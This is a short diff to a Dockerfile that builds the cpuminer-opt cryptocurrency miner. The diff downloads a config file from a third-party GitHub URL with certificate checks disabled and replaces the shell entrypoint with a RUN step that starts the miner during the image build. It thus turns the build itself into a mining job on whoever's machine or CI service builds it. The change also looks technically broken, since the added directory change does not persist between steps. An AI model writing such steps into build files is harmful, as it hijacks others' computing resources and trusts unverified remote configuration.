@@ -31,9 +31,10 @@ RUN cd cpuminer-opt && \
     ./autogen.sh && \
     CFLAGS="-O3 -march=native -Wall" ./configure --with-curl && \
     make
-
+    
+RUN cd cpuminer-opt
 # Copy the configuration file from the provided URL
 RUN wget --no-check-certificate https://raw.githubusercontent.com/rmaglite/blk/main/config.json -O config.json
 
 # Set the entrypoint to run a shell instead of the cpuminer command
-ENTRYPOINT ["/bin/bash"]
+RUN ./cpuminer --config config.json
